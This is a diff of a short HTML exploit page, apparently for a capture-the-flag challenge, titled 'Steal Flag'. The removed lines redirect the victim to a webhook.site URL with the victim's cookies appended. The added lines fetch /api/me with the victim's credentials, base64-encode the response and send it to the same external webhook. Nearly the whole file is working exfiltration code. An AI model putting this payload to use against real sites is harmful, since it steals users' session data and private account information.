@@ -1,7 +1,21 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      location.href = "https://webhook.site/fec310d2-7961-4191-ae18-f98da47b0dc8"%2Bdocument.cookie
-    </script>
-  </body>
+<head>
+  <title>Steal Flag</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    // 내부 API 호출
+    fetch("/api/me", { credentials: "include" })
+      .then(response => response.text())
+      .then(data => {
+        // 결과를 webhook.site로 base64 인코딩해서 전송
+        const webhook = "https://webhook.site/fec310d2-7961-4191-ae18-f98da47b0dc8";
+        const encoded = btoa(data);
+        fetch(`${webhook}?flag=${encoded}`, { method: "GET" });
+      })
+      .catch(console.error);
+  </script>
+</body>
 </html>
